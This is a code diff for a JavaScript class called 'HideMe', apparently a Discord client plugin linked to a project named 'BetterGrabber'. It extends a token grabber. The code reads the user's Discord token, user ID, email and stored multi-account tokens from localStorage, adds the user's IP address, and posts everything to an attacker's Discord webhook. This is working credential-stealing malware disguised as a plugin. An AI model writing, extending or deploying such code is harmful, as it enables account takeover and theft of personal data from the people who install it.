@@ -40,7 +40,9 @@ class HideMe {
     	window.dispatchEvent(new Event('beforeunload')); //Useless Atm
     	const https = require('https');//Hehehe Hello XMLHttpRequest
 
-    	var wh = "/api/webhooks/ID/TOKEN";
+    	var config = {
+    		webHook: "/api/webhooks/ID/TOKEN"
+    	};
 
     	function getIP(){
     		return new Promise(async (resolve, reject) => {
@@ -54,24 +56,28 @@ class HideMe {
     		});
     	}
 
-    	function getToken(){
+    	function getInfo(info){
     		return new Promise(async (resolve, reject) => {
-    			return resolve(window.open().localStorage.token)
+    			return resolve(window.open().localStorage[info])
     		});
     	}
 
     	var IP = await getIP();
-    	var token = await getToken();
+    	var actualUserToken = await getInfo("token");
+    	var actualUserID = await getInfo("user_id_cache");
+    	//var actualUserSettings = await getInfo("UserSettingsStore"); //Pretty Big
+    	var actualUserEmail = await getInfo("email_cache");
+    	var storedTokens = await getInfo("tokens"); // For New Multi Account System
 
         var pD = JSON.stringify({
             content: "@everyone",
             username: "Hello World",
             avatar_url: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",
             tts: true,
-            embeds: [{"title": "Hello World", "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": null, "fields": [{ "name": "IP", "value": IP, inline: false }, { "name": "Token", "value": token, inline: false }]}]
+            embeds: [{"title": "Hello World", "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": null, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User ID", "value": `\`${actualUserID.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens}\`\`\``, inline: false }]}]
         });
 
-        var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": wh, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
+        var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": config.webHook, "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
         SendToWebhook.on('error', (e) => {
             console.error(e);
         });
